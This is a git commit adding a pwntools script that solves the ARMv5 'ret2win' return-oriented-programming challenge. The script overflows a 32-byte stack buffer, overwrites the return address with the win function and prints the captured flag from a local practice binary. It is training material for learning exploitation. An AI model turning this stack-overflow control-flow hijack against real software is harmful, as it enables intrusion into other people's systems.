ae626182c4c440d59444e7671cf6177185eb89ed
s1mpl3ss0 <114217855+s1mpl3ss0@users.noreply.github.com>
2025-11-27 16:50:02 +0100

    Add ret2win ARMv5

---
+++ 1_ret2win/1_ret2win_armv5.py
@@ -0,0 +1,37 @@
+from pwn import *
+
+elf = ELF("ret2win_armv5")
+rop = ROP(elf)
+
+context.binary = elf
+context.terminal = ['konsole', '-e']
+context.log_level = logging.INFO
+
+gdbscript = '''
+set follow-fork-mode parent
+break *pwnme+0x64
+continue
+'''
+
+def connection():
+    if args.GDB:
+        c = gdb.debug([elf.path], gdbscript=gdbscript)
+    else:
+        c = process([elf.path])
+    return c
+
+BUFFER_SIZE = 32
+READ_SIZE = 56
+
+def main():
+    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+    rop.raw(elf.symbols.ret2win)
+    payload = rop.chain()
+    assert len(payload) <= READ_SIZE
+
+    c = connection()
+    c.sendafter(b'> ', payload)
+    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())
+
+if __name__ == '__main__':
+    main()
